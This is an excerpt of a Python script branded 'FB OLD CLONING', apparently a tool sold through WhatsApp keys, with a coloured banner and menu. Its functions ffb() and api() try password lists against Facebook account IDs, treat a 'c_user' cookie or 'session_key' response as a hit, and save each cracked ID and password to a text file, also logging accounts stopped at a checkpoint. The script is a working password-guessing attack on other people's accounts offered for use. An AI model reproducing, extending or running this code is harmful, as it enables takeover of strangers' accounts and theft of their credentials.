...
os.system('xdg-open https://facebook.com/groups/100080965356357/')
...
logo=("""\033[1;37m
 ...
 \033[1;31m██   ██  \033[1;36m██     \033[1;34m██     \033[1;35m██   ██ \033[1;31m██████                                                                                          
   ...
   \033[1;35m╔═════════════════════════════╗
   \033[1;36m║➣TOOL NAME : {FB OLD CLONING}                    
   \033[1;33m║➣AUTHOR        : {MD Riyadul Momin}                 
   \033[1;32m║➣WHATSAPP   : {+17867244875}                        
   \033[1;34m║➣YOUTUBE      : {Rk Trick's Point}                        
   \033[1;36m║➣GITHUB          : {github.com/Rk-Black}             
   \033[1;35m╚═════════════════════════════╝
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/100080965356357/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+17867244875&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Rk Riad Khan Sir, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RIYAD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [RIYAD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RIYAD-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RIYAD-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [RIYAD-OK] '+uid+' | '+pas+'\033[1;97m')
